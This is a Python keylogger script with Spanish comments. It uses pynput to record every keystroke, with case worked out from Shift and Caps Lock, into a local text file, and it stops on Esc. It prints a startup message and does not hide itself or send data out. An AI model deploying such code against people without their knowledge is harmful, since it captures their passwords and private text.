import ctypes
from pynput import keyboard

archivo_log = "./registro_teclas.txt"
teclas_presionadas = set()

def es_caps_lock_activo():
    # Solo para Windows: Verifica el estado del bit de Caps Lock (0x14)
    # Si usas Linux/Mac, esta función necesitaría una librería como 'os' o 'subprocess'
    return ctypes.windll.user32.GetKeyState(0x14) & 1 != 0

def al_pulsar(tecla):
    if tecla in teclas_presionadas:
        return
    teclas_presionadas.add(tecla)

    contenido = ""
    
    try:
        # 1. Gestionar letras (alfanuméricas)
        if hasattr(tecla, 'char') and tecla.char is not None:
            char = tecla.char
            
            # Verificamos si Shift está presionado físicamente
            shift_presionado = any(k in teclas_presionadas for k in [keyboard.Key.shift, keyboard.Key.shift_r])
            caps_activo = es_caps_lock_activo()

            # Lógica XOR: Si uno está activo pero no ambos, es Mayúscula. 
            # Si ambos están activos, se "anulan" y vuelve a minúscula.
            if caps_activo ^ shift_presionado:
                contenido = char.upper()
            else:
                contenido = char.lower()

        # 2. Gestionar teclas especiales
        else:
            if tecla == keyboard.Key.space:
                contenido = " "
            elif tecla == keyboard.Key.enter:
                contenido = "\n"
            elif tecla == keyboard.Key.backspace:
                contenido = " [BORRAR] "
            # No registramos Shift/Caps_Lock como texto para no ensuciar
            
    except Exception as e:
        print(f"Error: {e}")

    if contenido:
        with open(archivo_log, "a", encoding="utf-8") as f:
            f.write(contenido)

def al_soltar(tecla):
    if tecla in teclas_presionadas:
        teclas_presionadas.remove(tecla)
    if tecla == keyboard.Key.esc:
        return False

print("Logger avanzado iniciado. Detectando Bloq Mayús y Shift...")
with keyboard.Listener(on_press=al_pulsar, on_release=al_soltar) as escuchador:
    escuchador.join()
